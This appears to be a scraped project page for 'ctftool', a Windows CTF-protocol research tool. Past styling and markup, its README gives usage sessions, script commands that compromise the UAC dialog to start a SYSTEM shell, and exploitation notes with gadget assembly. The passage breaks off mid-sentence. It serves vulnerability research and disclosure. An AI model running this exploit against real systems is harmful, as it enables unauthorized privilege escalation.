BdmdXC5AVKFu3e5MfNFJ29KTQT48Ob9/lqYwOGZxeUelN2U2R6+cArgtCJpauW7UQBqnFkUsjAY/kOU1cP+DAgvxwn1chZDwUbd6CFimGXwzwF6tPbFIcjEl+vvmM/byA48e6tWrKArm4ZJlCbdsrxksL1AwWn/yBSJKpYbq8AXaaTb8AAHja28jAwOC00ZrBeQNDQOWO//sdBBgYGRiYWYAEELEwMTE4uzo5Zzo5b2BxdnFOcALxNjA6b2ByTswC8jYwg0VlNuoCTWAMqNzMzsoK1rEhNqByEyerg5PMJlYuVueETKcd/89uBpnpvIEVomeHLoMsAAe1Id4AAAAAAAB42oWQT07CQBTGv0JBhagk7HQzKxca2sJCE1hDt4QF+9JOS0nbaaYDCQfwCJ7Au3AHj+LO13FMmm6cl7785vven0kBjHCBhfpYuNa5Ph1c0e2Xu3jEvWG7UdPDLZ4N92nOm+EBXuAbHmIMSRMs+4aUEd4Nd3CHD8NdvOLTsA2GL8M9PODbcL+hD7C1xoaHeLJSEao0FEW14ckxC+TU8TxvsY6X0eLPmRhry2WVioLpkrbp84LLQPGI7c6sOiUzpWIWS5GzlSgUzzLBSikOPFTOXqly7rqx0Z1Q5BAIoZBSFihQYQOOBEdkCOgXTOHA07HAGjGWiIjaPZNW13/+lm6S9FT7rLHFJ6fQbkATOG1j2OFMucKJJsxIVfQORl+9Jyda6Sl1dUYhSCm1dyClfoeDve4qMYdLEbfqHf3O/AdDumsjAAB42mNgYoAAZQYjBmyAGYQZmdhL8zLdDEydARfoAqIAAAABAAMABwAKABMAB///AA8AAQAAAAAAAAAAAAAAAAABAAAAAA==) format('woff');
+      }
+      .markdown-body {
+        -ms-text-size-adjust: 100%;
+        -webkit-text-size-adjust: 100%;
+        line-height: 1.5;
+        color: #24292e;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+        font-size: 16px;
+        line-height: 1.5;
+        word-wrap: break-word;
+      }
+      .markdown-body .pl-c {
+        color: #6a737d;
+      }
+      .markdown-body .pl-c1,
+      .markdown-body .pl-s .pl-v {
+        color: #005cc5;
+      }
+      .markdown-body .pl-e,
+      .markdown-body .pl-en {
+        color: #6f42c1;
+      }
+      .markdown-body .pl-smi,
+      .markdown-body .pl-s .pl-s1 {
+        color: #24292e;
+      }
+      .markdown-body .pl-ent {
+        color: #22863a;
+      }
+      .markdown-body .pl-k {
+        color: #d73a49;
+      }
+      .markdown-body .pl-s,
+      .markdown-body .pl-pds,
+      .markdown-body .pl-s .pl-pse .pl-s1,
+      .markdown-body .pl-sr,
+      .markdown-body .pl-sr .pl-cce,
+      .markdown-body .pl-sr .pl-sre,
+      .markdown-body .pl-sr .pl-sra {
+        color: #032f62;
+      }
+      .markdown-body .pl-v,
+      .markdown-body .pl-smw {
+        color: #e36209;
+      }
+      .markdown-body .pl-bu {
+        color: #b31d28;
+      }
+      .markdown-body .pl-ii {
+        color: #fafbfc;
+        background-color: #b31d28;
+      }
+      .markdown-body .pl-c2 {
+        color: #fafbfc;
+        background-color: #d73a49;
+      }
+      .markdown-body .pl-c2::before {
+        content: "^M";
+      }
+      .markdown-body .pl-sr .pl-cce {
+        font-weight: bold;
+        color: #22863a;
+      }
+      .markdown-body .pl-ml {
+        color: #735c0f;
+      }
+      .markdown-body .pl-mh,
+      .markdown-body .pl-mh .pl-en,
+      .markdown-body .pl-ms {
+        font-weight: bold;
+        color: #005cc5;
+      }
+      .markdown-body .pl-mi {
+        font-style: italic;
+        color: #24292e;
+      }
+      .markdown-body .pl-mb {
+        font-weight: bold;
+        color: #24292e;
+      }
+      .markdown-body .pl-md {
+        color: #b31d28;
+        background-color: #ffeef0;
+      }
+      .markdown-body .pl-mi1 {
+        color: #22863a;
+        background-color: #f0fff4;
+      }
+      .markdown-body .pl-mc {
+        color: #e36209;
+        background-color: #ffebda;
+      }
+      .markdown-body .pl-mi2 {
+        color: #f6f8fa;
+        background-color: #005cc5;
+      }
+      .markdown-body .pl-mdr {
+        font-weight: bold;
+        color: #6f42c1;
+      }
+      .markdown-body .pl-ba {
+        color: #586069;
+      }
+      .markdown-body .pl-sg {
+        color: #959da5;
+      }
+      .markdown-body .pl-corl {
+        text-decoration: underline;
+        color: #032f62;
+      }
+      .markdown-body .octicon {
+        display: inline-block;
+        vertical-align: text-top;
+        fill: currentColor;
+      }
+      .markdown-body a {
+        background-color: transparent;
+      }
+      .markdown-body a:active,
+      .markdown-body a:hover {
+        outline-width: 0;
+      }
+      .markdown-body strong {
+        font-weight: inherit;
+      }
+      .markdown-body strong {
+        font-weight: bolder;
+      }
+      .markdown-body h1 {
+        font-size: 2em;
+        margin: 0.67em 0;
+      }
+      .markdown-body img {
+        border-style: none;
+      }
+      .markdown-body code,
+      .markdown-body kbd,
+      .markdown-body pre {
+        font-family: monospace, monospace;
+        font-size: 1em;
+      }
+      .markdown-body hr {
+        box-sizing: content-box;
+        height: 0;
+        overflow: visible;
+      }
+      .markdown-body input {
+        font: inherit;
+        margin: 0;
+      }
+      .markdown-body input {
+        overflow: visible;
+      }
+      .markdown-body [type="checkbox"] {
+        box-sizing: border-box;
+        padding: 0;
+      }
+      .markdown-body * {
+        box-sizing: border-box;
+      }
+      .markdown-body input {
+        font-family: inherit;
+        font-size: inherit;
+        line-height: inherit;
+      }
+      .markdown-body a {
+        color: #0366d6;
+        text-decoration: none;
+      }
+      .markdown-body a:hover {
+        text-decoration: underline;
+      }
+      .markdown-body strong {
+        font-weight: 600;
+      }
+      .markdown-body hr {
+        height: 0;
+        margin: 15px 0;
+        overflow: hidden;
+        background: transparent;
+        border: 0;
+        border-bottom: 1px solid #dfe2e5;
+      }
+      .markdown-body hr::before {
+        display: table;
+        content: "";
+      }
+      .markdown-body hr::after {
+        display: table;
+        clear: both;
+        content: "";
+      }
+      .markdown-body table {
+        border-spacing: 0;
+        border-collapse: collapse;
+      }
+      .markdown-body td,
+      .markdown-body th {
+        padding: 0;
+      }
+      .markdown-body h1,
+      .markdown-body h2,
+      .markdown-body h3,
+      .markdown-body h4,
+      .markdown-body h5,
+      .markdown-body h6 {
+        margin-top: 0;
+        margin-bottom: 0;
+      }
+      .markdown-body h1 {
+        font-size: 32px;
+        font-weight: 600;
+      }
+      .markdown-body h2 {
+        font-size: 24px;
+        font-weight: 600;
+      }
+      .markdown-body h3 {
+        font-size: 20px;
+        font-weight: 600;
+      }
+      .markdown-body h4 {
+        font-size: 16px;
+        font-weight: 600;
+      }
+      .markdown-body h5 {
+        font-size: 14px;
+        font-weight: 600;
+      }
+      .markdown-body h6 {
+        font-size: 12px;
+        font-weight: 600;
+      }
+      .markdown-body p {
+        margin-top: 0;
+        margin-bottom: 10px;
+      }
+      .markdown-body blockquote {
+        margin: 0;
+      }
+      .markdown-body ul,
+      .markdown-body ol {
+        padding-left: 0;
+        margin-top: 0;
+        margin-bottom: 0;
+      }
+      .markdown-body ol ol,
+      .markdown-body ul ol {
+        list-style-type: lower-roman;
+      }
+      .markdown-body ul ul ol,
+      .markdown-body ul ol ol,
+      .markdown-body ol ul ol,
+      .markdown-body ol ol ol {
+        list-style-type: lower-alpha;
+      }
+      .markdown-body dd {
+        margin-left: 0;
+      }
+      .markdown-body code {
+        font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
+        font-size: 12px;
+      }
+      .markdown-body pre {
+        margin-top: 0;
+        margin-bottom: 0;
+        font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
+        font-size: 12px;
+      }
+      .markdown-body .octicon {
+        vertical-align: text-bottom;
+      }
+      .markdown-body .pl-0 {
+        padding-left: 0 !important;
+      }
+      .markdown-body .pl-1 {
+        padding-left: 4px !important;
+      }
+      .markdown-body .pl-2 {
+        padding-left: 8px !important;
+      }
+      .markdown-body .pl-3 {
+        padding-left: 16px !important;
+      }
+      .markdown-body .pl-4 {
+        padding-left: 24px !important;
+      }
+      .markdown-body .pl-5 {
+        padding-left: 32px !important;
+      }
+      .markdown-body .pl-6 {
+        padding-left: 40px !important;
+      }
+      .markdown-body::before {
+        display: table;
+        content: "";
+      }
+      .markdown-body::after {
+        display: table;
+        clear: both;
+        content: "";
+      }
+      .markdown-body>*:first-child {
+        margin-top: 0 !important;
+      }
+      .markdown-body>*:last-child {
+        margin-bottom: 0 !important;
+      }
+      .markdown-body a:not([href]) {
+        color: inherit;
+        text-decoration: none;
+      }
+      .markdown-body .anchor {
+        float: left;
+        padding-right: 4px;
+        margin-left: -20px;
+        line-height: 1;
+      }
+      .markdown-body .anchor:focus {
+        outline: none;
+      }
+      .markdown-body p,
+      .markdown-body blockquote,
+      .markdown-body ul,
+      .markdown-body ol,
+      .markdown-body dl,
+      .markdown-body table,
+      .markdown-body pre {
+        margin-top: 0;
+        margin-bottom: 16px;
+      }
+      .markdown-body hr {
+        height: 0.25em;
+        padding: 0;
+        margin: 24px 0;
+        background-color: #e1e4e8;
+        border: 0;
+      }
+      .markdown-body blockquote {
+        padding: 0 1em;
+        color: #6a737d;
+        border-left: 0.25em solid #dfe2e5;
+      }
+      .markdown-body blockquote>:first-child {
+        margin-top: 0;
+      }
+      .markdown-body blockquote>:last-child {
+        margin-bottom: 0;
+      }
+      .markdown-body kbd {
+        display: inline-block;
+        padding: 3px 5px;
+        font-size: 11px;
+        line-height: 10px;
+        color: #444d56;
+        vertical-align: middle;
+        background-color: #fafbfc;
+        border: solid 1px #c6cbd1;
+        border-bottom-color: #959da5;
+        border-radius: 3px;
+        box-shadow: inset 0 -1px 0 #959da5;
+      }
+      .markdown-body h1,
+      .markdown-body h2,
+      .markdown-body h3,
+      .markdown-body h4,
+      .markdown-body h5,
+      .markdown-body h6 {
+        margin-top: 24px;
+        margin-bottom: 16px;
+        font-weight: 600;
+        line-height: 1.25;
+      }
+      .markdown-body h1 .octicon-link,
+      .markdown-body h2 .octicon-link,
+      .markdown-body h3 .octicon-link,
+      .markdown-body h4 .octicon-link,
+      .markdown-body h5 .octicon-link,
+      .markdown-body h6 .octicon-link {
+        color: #1b1f23;
+        vertical-align: middle;
+        visibility: hidden;
+      }
+      .markdown-body h1:hover .anchor,
+      .markdown-body h2:hover .anchor,
+      .markdown-body h3:hover .anchor,
+      .markdown-body h4:hover .anchor,
+      .markdown-body h5:hover .anchor,
+      .markdown-body h6:hover .anchor {
+        text-decoration: none;
+      }
+      .markdown-body h1:hover .anchor .octicon-link,
+      .markdown-body h2:hover .anchor .octicon-link,
+      .markdown-body h3:hover .anchor .octicon-link,
+      .markdown-body h4:hover .anchor .octicon-link,
+      .markdown-body h5:hover .anchor .octicon-link,
+      .markdown-body h6:hover .anchor .octicon-link {
+        visibility: visible;
+      }
+      .markdown-body h1 {
+        padding-bottom: 0.3em;
+        font-size: 2em;
+        border-bottom: 1px solid #eaecef;
+      }
+      .markdown-body h2 {
+        padding-bottom: 0.3em;
+        font-size: 1.5em;
+        border-bottom: 1px solid #eaecef;
+      }
+      .markdown-body h3 {
+        font-size: 1.25em;
+      }
+      .markdown-body h4 {
+        font-size: 1em;
+      }
+      .markdown-body h5 {
+        font-size: 0.875em;
+      }
+      .markdown-body h6 {
+        font-size: 0.85em;
+        color: #6a737d;
+      }
+      .markdown-body ul,
+      .markdown-body ol {
+        padding-left: 2em;
+      }
+      .markdown-body ul ul,
+      .markdown-body ul ol,
+      .markdown-body ol ol,
+      .markdown-body ol ul {
+        margin-top: 0;
+        margin-bottom: 0;
+      }
+      .markdown-body li {
+        word-wrap: break-all;
+      }
+      .markdown-body li>p {
+        margin-top: 16px;
+      }
+      .markdown-body li+li {
+        margin-top: 0.25em;
+      }
+      .markdown-body dl {
+        padding: 0;
+      }
+      .markdown-body dl dt {
+        padding: 0;
+        margin-top: 16px;
+        font-size: 1em;
+        font-style: italic;
+        font-weight: 600;
+      }
+      .markdown-body dl dd {
+        padding: 0 16px;
+        margin-bottom: 16px;
+      }
+      .markdown-body table {
+        display: block;
+        width: 100%;
+        overflow: auto;
+      }
+      .markdown-body table th {
+        font-weight: 600;
+      }
+      .markdown-body table th,
+      .markdown-body table td {
+        padding: 6px 13px;
+        border: 1px solid #dfe2e5;
+      }
+      .markdown-body table tr {
+        background-color: #fff;
+        border-top: 1px solid #c6cbd1;
+      }
+      .markdown-body table tr:nth-child(2n) {
+        background-color: #f6f8fa;
+      }
+      .markdown-body img {
+        max-width: 100%;
+        box-sizing: content-box;
+        background-color: #fff;
+      }
+      .markdown-body img[align=right] {
+        padding-left: 20px;
+      }
+      .markdown-body img[align=left] {
+        padding-right: 20px;
+      }
+      .markdown-body code {
+        padding: 0.2em 0.4em;
+        margin: 0;
+        font-size: 85%;
+        background-color: rgba(27,31,35,0.05);
+        border-radius: 3px;
+      }
+      .markdown-body pre {
+        word-wrap: normal;
+      }
+      .markdown-body pre>code {
+        padding: 0;
+        margin: 0;
+        font-size: 100%;
+        word-break: normal;
+        white-space: pre;
+        background: transparent;
+        border: 0;
+      }
+      .markdown-body .highlight {
+        margin-bottom: 16px;
+      }
+      .markdown-body .highlight pre {
+        margin-bottom: 0;
+        word-break: normal;
+      }
+      .markdown-body .highlight pre,
+      .markdown-body pre {
+        padding: 16px;
+        overflow: auto;
+        font-size: 85%;
+        line-height: 1.45;
+        background-color: #f6f8fa;
+        border-radius: 3px;
+      }
+      .markdown-body pre code {
+        display: inline;
+        max-width: auto;
+        padding: 0;
+        margin: 0;
+        overflow: visible;
+        line-height: inherit;
+        word-wrap: normal;
+        background-color: transparent;
+        border: 0;
+      }
+      .markdown-body .full-commit .btn-outline:not(:disabled):hover {
+        color: #005cc5;
+        border-color: #005cc5;
+      }
+      .markdown-body kbd {
+        display: inline-block;
+        padding: 3px 5px;
+        font: 11px "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
+        line-height: 10px;
+        color: #444d56;
+        vertical-align: middle;
+        background-color: #fafbfc;
+        border: solid 1px #d1d5da;
+        border-bottom-color: #c6cbd1;
+        border-radius: 3px;
+        box-shadow: inset 0 -1px 0 #c6cbd1;
+      }
+      .markdown-body :checked+.radio-label {
+        position: relative;
+        z-index: 1;
+        border-color: #0366d6;
+      }
+      .markdown-body .task-list-item {
+        list-style-type: none;
+      }
+      .markdown-body .task-list-item+.task-list-item {
+        margin-top: 3px;
+      }
+      .markdown-body .task-list-item input {
+        margin: 0 0.2em 0.25em -1.6em;
+        vertical-align: middle;
+      }
+      .markdown-body hr {
+        border-bottom-color: #eee;
+      }
+      /* github-markdown.css overrides */
+      .markdown-body h2 {
+        margin-bottom: 0;
+        margin-top: 0;
+      }
+
+      .hll { background-color: #ffffcc }
+      .c { color: #008000 } /* Comment */
+      .err { border: 1px solid #FF0000 } /* Error */
+      .k { color: #0000ff } /* Keyword */
+      .cm { color: #008000 } /* Comment.Multiline */
+      .cp { color: #0000ff } /* Comment.Preproc */
+      .c1 { color: #008000 } /* Comment.Single */
+      .cs { color: #008000 } /* Comment.Special */
+      .ge { font-style: italic } /* Generic.Emph */
+      .gh { font-weight: bold } /* Generic.Heading */
+      .gp { font-weight: bold } /* Generic.Prompt */
+      .gs { font-weight: bold } /* Generic.Strong */
+      .gu { font-weight: bold } /* Generic.Subheading */
+      .kc { color: #0000ff } /* Keyword.Constant */
+      .kd { color: #0000ff } /* Keyword.Declaration */
+      .kn { color: #0000ff } /* Keyword.Namespace */
+      .kp { color: #0000ff } /* Keyword.Pseudo */
+      .kr { color: #0000ff } /* Keyword.Reserved */
+      .kt { color: #2b91af } /* Keyword.Type */
+      .s { color: #a31515 } /* Literal.String */
+      .nc { color: #2b91af } /* Name.Class */
+      .ow { color: #0000ff } /* Operator.Word */
+      .sb { color: #a31515 } /* Literal.String.Backtick */
+      .sc { color: #a31515 } /* Literal.String.Char */
+      .sd { color: #a31515 } /* Literal.String.Doc */
+      .s2 { color: #a31515 } /* Literal.String.Double */
+      .se { color: #a31515 } /* Literal.String.Escape */
+      .sh { color: #a31515 } /* Literal.String.Heredoc */
+      .si { color: #a31515 } /* Literal.String.Interpol */
+      .sx { color: #a31515 } /* Literal.String.Other */
+      .sr { color: #a31515 } /* Literal.String.Regex */
+      .s1 { color: #a31515 } /* Literal.String.Single */
+      .ss { color: #a31515 } /* Literal.String.Symbol */
+
+    </style>
+
+    <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Product",
+  "name": "taviso/ctftool",
+  "description": "Interactive CTF Exploration Tool",
+  "url": "https://awesomeopensource.com/project/taviso/ctftool",
+  "sku": "project/taviso/ctftool",
+  "mpn": "project/taviso/ctftool",
+  "image": "https://github.com/taviso.png",
+  "brand": {
+    "@type": "Brand",
+    "name": "taviso/ctftool",
+    "logo": "https://github.com/taviso.png"
+  },
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "4.94",
+    "ratingCount": "1514"
+  }
+}
+</script>
+
+
+    <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="wDpLP5EiDVIaPiT8UtbTU5hrjJ+ICqtjp5OflLMKakGoLLfakg1O8HfM5gBCwfwCBE7Ujudhq2m/V7gcXxUL0Q==" />
+  <script async src='/cdn-cgi/bm/cv/669835187/api.js'></script></head>
+
+  <body>
+    <script type="application/json" id="js-react-on-rails-context">{"railsEnv":"production","inMailer":false,"i18nLocale":"en","i18nDefaultLocale":"en","rorVersion":"11.2.1","rorPro":false,"href":"http://awesomeopensource.com/project/taviso/ctftool","location":"/project/taviso/ctftool","scheme":"http","host":"awesomeopensource.com","port":null,"pathname":"/project/taviso/ctftool","search":null,"httpAcceptLanguage":null,"serverSide":false}</script>
+<div id="Root-react-component-4530f296-cac6-47fb-a256-5e139dabc57c"><div style="font-family:helvetica, arial, sans-serif" data-reactroot=""><div class="aos_fixed_header_container"><div class="display_flex margin_bottom_15"><div style="margin-right:1%;display:flex;align-items:center"><a href="https://awesomeopensource.com" title="Awesome Open Source Home" rel="canonical"><img src="https://awesomeopensource.com/awesome.gif" class="aos_logo_image"/></a></div><div class="aos_header_title_container_larger_than_ipad"><div style="white-space:nowrap;font-size:24px;font-weight:bold;display:flex;flex-direction:row;align-items:center;height:100%"><div>Awesome Open Source</div></div></div><div class="aos_header_title_container_ipad_and_smaller"><div>Awesome Open Source</div></div><div style="display:flex;flex-wrap:wrap"></div></div><div></div></div><div class="aos_project_screen_container"><div class="aos_project_inner_screen_container"><div class="aos_project_metadata"><div class="aos_project_metadata_title">Ctftool</div><div class="aos_project_metadata_description">Interactive CTF Exploration Tool</div><div class="aos_project_metadata_header">Stars</div><span class="aos_project_metadata_content">1,514</span><div class="project_page_ad_slot_1"><ins class="adsbygoogle" style="display:block" data-ad-format="fluid" data-ad-layout-key="-gv-v+1t-u+27" data-ad-client="ca-pub-1878397330895234" data-ad-slot="5649017589"></ins></div><div class="aos_project_metadata_header aos_license_text_metadata">License</div><span class="aos_project_metadata_content">apache-2.0</span><div class="aos_project_metadata_header"><a href="https://github.com/taviso/ctftool" target="_blank" class="aos_grey_link" rel="nofollow">Repository</a></div><span class="aos_project_metadata_content"><a href="https://github.com/taviso/ctftool" target="_blank">https://github.com/taviso/ctftool</a></span><div class="aos_project_metadata_header"><a href="https://github.com/taviso/ctftool/issues" target="_blank" class="aos_grey_link" rel="nofollow">Open Issues</a></div><span class="aos_project_metadata_content"><a href="https://github.com/taviso/ctftool/issues" target="_blank">15</a></span><div class="aos_project_metadata_header">Most Recent Commit</div><span class="aos_project_metadata_content">2 months ago</span><div class="aos_project_metadata_header">Related Projects</div><span class="aos_project_metadata_content"><a href="https://awesomeopensource.com/projects/c"><div style="display:block;text-decoration:none;padding-bottom:10px">c<span> (<!-- -->14,340<!-- -->)</span></div></a><a href="https://awesomeopensource.com/projects/security"><div style="display:block;text-decoration:none;padding-bottom:10px">security<span> (<!-- -->1,760<!-- -->)</span></div></a><a href="https://awesomeopensource.com/projects/windows"><div style="display:block;text-decoration:none;padding-bottom:10px">windows<span> (<!-- -->1,331<!-- -->)</span></div></a><a href="https://awesomeopensource.com/projects/reverse-engineering"><div style="display:block;text-decoration:none;padding-bottom:10px">reverse-engineering<span> (<!-- -->446<!-- -->)</span></div></a></span></div><div class="markdown-body"><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html><body>
+<h1>
+<a id="ctftool" class="anchor" href="#ctftool" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>CTFTOOL</h1>
+<blockquote>
+<p>Just want to test the SYSTEM exploit? <a href="#Exploit">Click here</a>.</p>
+</blockquote>
+<p><a href="https://www.youtube.com/watch?v=r3vrzzDpmhc" rel="nofollow"><img src="https://raw.githubusercontent.com/taviso/ctftool/master/docs/thumb.png" alt="Video of Exploit" style="max-width:100%;"></a></p>
+<h2>
+<a id="an-interactive-ctf-exploration-tool" class="anchor" href="#an-interactive-ctf-exploration-tool" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>An Interactive CTF Exploration Tool</h2>
+<p>This is <code>ctftool</code>, an interactive command line tool to experiment with CTF, a
+little-known protocol used on Windows to implement Text Services. This might
+be useful for studying Windows internals, debugging complex issues with Text
+Input Processors and analyzing Windows security.</p>
+<p>It is possible to write simple scripts with <code>ctftool</code> for automating interaction
+with CTF clients or servers, or perform simple fuzzing.</p>
+<h2>
+<a id="background" class="anchor" href="#background" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Background</h2>
+<p>There is a blog post that accompanies the release of this tool available here.</p>
+<p><a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html" rel="nofollow">https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</a></p>
+<h2>
+<a id="usage" class="anchor" href="#usage" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Usage</h2>
+<p><code>ctftool</code> has been tested on Windows 7, Windows 8 and Windows 10. Both 32-bit
+and x64 versions are supported, but x64 has been tested more extensively.</p>
+<p>There is online help for most commands, simply type <code>help</code> to see a list of
+commands, and <code>help &lt;command&gt;</code> to see detailed help for a particular command.</p>
+<pre><code>$ ./ctftool.exe
+An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+Most commands require a connection, see "help connect".
+ctf&gt; help
+Type `help &lt;command&gt;` for help with a specific command.
+Any line beginning with # is considered a comment.
+
+help            - List available commands.
+exit            - Exit the shell.
+connect         - Connect to CTF ALPC Port.
+info            - Query server informaiton.
+scan            - Enumerate connected clients.
+callstub        - Ask a client to invoke a function.
+createstub      - Ask a client to instantiate CLSID.
+hijack          - Attempt to hijack an ALPC server path.
+sendinput       - Send keystrokes to thread.
+setarg          - Marshal a parameter.
+getarg          - Unmarshal a parameter.
+wait            - Wait for a process and set it as the default thread.
+thread          - Set the default thread.
+sleep           - Sleep for specified milliseconds.
+forget          - Forget all known stubs.
+stack           - Print the last leaked stack ptr.
+marshal         - Send command with marshalled parameters.
+proxy           - Send command with proxy parameters.
+call            - Send command without appended data.
+window          - Create and register a message window.
+patch           - Patch a marshalled parameter.
+module          - Print the base address of a module.
+module64        - Print the base address of a 64bit module.
+editarg         - Change the type of a marshalled parameter.
+symbol          - Lookup a symbol offset from ImageBase.
+set             - Change or dump various ctftool parameters.
+show            - Show the value of special variables you can use.
+lock            - Lock the workstation, switch to Winlogon desktop.
+repeat          - Repeat a command multiple times.
+run             - Run a command.
+script          - Source a script file.
+print           - Print a string.
+consent         - Invoke the UAC consent dialog.
+reg             - Lookup a DWORD in the registry.
+gadget          - Find the offset of a pattern in a file.
+section         - Lookup property of PE section.
+Most commands require a connection, see "help connect".
+ctf&gt;
+</code></pre>
+<p>The first thing you will want to do is connect to a session, and see which
+clients are connected.</p>
+<pre><code>ctf&gt; connect
+The ctf server port is located at \BaseNamedObjects\msctf.serverDefault1
+NtAlpcConnectPort("\BaseNamedObjects\msctf.serverDefault1") =&gt; 0
+Connected to CTF <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="6615031410031426">[email&#160;protected]</a>\BaseNamedObjects\msctf.serverDefault1, Handle 00000264
+ctf&gt; scan
+Client 0, Tid 3400 (Flags 0x08, Hwnd 00000D48, Pid 8696, explorer.exe)
+Client 1, Tid 7692 (Flags 0x08, Hwnd 00001E0C, Pid 8696, explorer.exe)
+Client 2, Tid 9424 (Flags 0x0c, Hwnd 000024D0, Pid 9344, SearchUI.exe)
+Client 3, Tid 12068 (Flags 0x08, Hwnd 00002F24, Pid 12156, PROCEXP64.exe)
+Client 4, Tid 9740 (Flags 0000, Hwnd 0000260C, Pid 3840, ctfmon.exe)
+</code></pre>
+<p>You can then experiment by sending and receiving commands to the server, or any
+of the connected clients.</p>
+<h2>
+<a id="building" class="anchor" href="#building" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Building</h2>
+<blockquote>
+<p>If you don't want to build it yourself, check out the <a href="https://github.com/taviso/ctftool/releases" rel="nofollow">releases</a> tab</p>
+</blockquote>
+<p>I used <a href="http://gnuwin32.sourceforge.net/packages/make.htm" rel="nofollow">GNU make</a> and Visual
+Studio 2019 to develop <code>ctftool</code>. Only 32-bit builds are supported, as this
+allows the tool to run on x86 and x64 Windows.</p>
+<p>If all the dependencies are installed, just typing <code>make</code> in a developer command
+prompt should be enough.</p>
+<p>I use the "Build Tools" variant of Visual Studio, and the only components I have
+selected are MSVC, MSBuild, CMake and the SDK.</p>
+<p>This project uses submodules for some of the dependencies, be sure that you're
+using a command like this to fetch all the required code.</p>
+<pre><code>git submodule update --init --recursive
+</code></pre>
+<h2>
+<a id="exploit" class="anchor" href="#exploit" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Exploit</h2>
+<blockquote>
+<p>The examples only work on Windows 10 x64. All platforms and versions since
+Windows XP are affected, but no PoC is currently implemented.</p>
+</blockquote>
+<p>This tool was used to discover many critical security problem with the CTF
+protocol that have existed for decades.</p>
+<p>If you just want to test an exploit on Windows 10 x64 1903, run or double-click
+<code>ctftool.exe</code> and enter this command:</p>
+<pre><code>An interactive ctf exploration tool by @taviso.
+Type "help" for available commands.
+Most commands require a connection, see "help connect".
+ctf&gt; script .\scripts\ctf-consent-system.ctf
+</code></pre>
+<p>This will wait for the UAC dialog to appear, compromise it and start a shell.</p>
+<p>In fact, the exploit code is split into two stages that you can use
+independently. For example, you might want to compromise a process belonging to
+a user on a different session using the optional parameters to <code>connect</code>.</p>
+<p>Most CTF clients can be compromised, as the kernel forces applications that draw
+windows to load the vulnerable library.</p>
+<p>Simply connect to a session, select a client to compromise (use the <code>scan</code> and
+<code>thread</code> commands, or just <code>wait</code>), then:</p>
+<pre><code>ctf&gt; script .\scripts\ctf-exploit-common-win10.ctf
+</code></pre>
+<h3>
+<a id="exploitation-notes" class="anchor" href="#exploitation-notes" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Exploitation Notes</h3>
+<p>Building a CFG jump chain that worked on the majority of CTF clients was quite
+challenging. There are two primary components to the final exploit, an arbitrary
+write primitive and then setting up our registers to call <code>LoadLibrary()</code>.</p>
+<blockquote>
+<p>You can use <code>dumpbin /headers /loadconfig</code> to dump the whitelisted branch
+targets.</p>
+</blockquote>
+<h4>
+<a id="arbitrary-write" class="anchor" href="#arbitrary-write" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Arbitrary Write</h4>
+<p>I need an arbitrary write gadget to create objects in a predictable location.
+The best usable gadget I was able to find was an arbitrary dword decrement in
+<code>msvcrt!_init_time</code>.</p>
+<p>This means rather than just setting the values we want, We have to keep
+decrementing until the LSB reaches the value we want. This is a lot of work,
+but we never have to do more than <code>(2^8 - 1) * len</code> decrements.</p>
+<p><a href="https://github.com/taviso/ctftool/blob/master/docs/decrement-arbitrary-value.gif" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/taviso/ctftool/master/docs/decrement-arbitrary-value.gif" alt="Decrement Write" style="max-width:100%;"></a></p>
+<p>Using this primitive, I build an object like this in some unused slack space
+in kernel32 <code>.data</code> section. It needs to be part of an image so that I can
+predict where it will be mapped, as image randomization is per-boot on Windows.</p>
+<p><a href="https://github.com/taviso/ctftool/blob/master/docs/fake-object-layout.png" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/taviso/ctftool/master/docs/fake-object-layout.png" alt="Object Layout" style="max-width:100%;"></a></p>
+<p>There were (of course) lots of arbitrary write gadgets, the problem was
+regaining control of execution <em>after</em> the write. This proved quite challenging,
+and that's the reason I was stuck with a dword decrement instead of something
+simpler.</p>
+<p>MSCTF catches all exceptions, so the challenge was finding an arbitrary write
+that didn't mess up the stack so that SEH survived, or crashed really quickly
+without doing any damage.</p>
+<p>The <code>msvcrt!_init_time</code> gadget was the best I could find, within a few
+instructions it dereferences NULL without corrupting any more memory. This means
+we can repeat it ad infinitum.</p>
+<h4>
+<a id="redirecting-execution" class="anchor" href="#redirecting-execution" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Redirecting Execution</h4>
+<p>I found two useful gadgets for adjusting registers, The first was:</p>
+<pre><code>combase!CStdProxyBuffer_CF_AddRef:
+      mov     rcx,qword ptr [rcx-38h]
+      mov     rax,qword ptr [rcx]    
+      mov     rax,qword ptr [rax+8]  
+      jmp     qword ptr [combase!__guard_dispatch_icall_fptr]
+</code></pre>
+<p>And the second was:</p>
+<pre><code>MSCTF!CCompartmentEventSink::OnChange:
+      mov     rax,qword ptr [rcx+30h]
+      mov     rcx,qword ptr [rcx+38h]
+      jmp     qword ptr [MSCTF!_guard_dispatch_icall_fptr]
+</code></pre>
+<p>By combining these two gadgets with the object we formed with our write gadget,
